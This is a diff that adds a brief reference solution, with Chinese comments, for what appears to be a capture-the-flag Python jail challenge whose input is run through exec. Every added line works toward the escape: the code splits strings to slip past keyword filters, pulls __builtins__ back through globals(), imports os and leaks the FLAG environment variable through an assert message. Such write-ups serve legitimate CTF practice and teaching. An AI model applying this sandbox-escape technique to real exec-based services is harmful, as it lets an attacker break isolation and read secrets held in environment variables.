@@ -1,0 +1,7 @@
+参考解法（nc 连接后粘贴，输入经 exec 执行）：
+
+# exec 命名空间的 __builtins__ 键可通过 globals() 读回（是 module），
+# getattr 挖出 __import__
+B = globals()['__bu'+'iltins__']
+O = getattr(B, '__i'+'mport__')('o'+'s')
+assert 0, getattr(O, 'envi'+'ron')['F'+'LAG']
